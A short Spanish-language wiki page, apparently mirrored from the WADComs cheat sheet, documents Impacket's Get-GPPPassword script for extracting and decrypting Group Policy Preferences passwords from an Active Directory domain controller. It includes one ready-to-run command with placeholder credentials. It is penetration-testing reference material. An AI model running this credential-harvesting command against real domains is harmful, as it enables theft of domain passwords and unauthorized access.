# WADComs: Impacket-Get-GPPPassword

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Password`, `Username`, `Hash`

**Sistema:** `Linux`, `Windows`

## Descripción

Python script to automatically extract and decrypt Group Policy Preferences (GPP) passwords using streams for carving files instead of mounting shares

Command Reference:

	Target IP: 10.10.10.1

	Domain: test.local

	Username: john

	Password: password123

## Comando

```bash
python3 Get-GPPPassword.py 'TEST.local/john:password123@DC01.TEST.local' -dc-ip 10.10.10.1
```

## Referencias

- https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py
- https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/
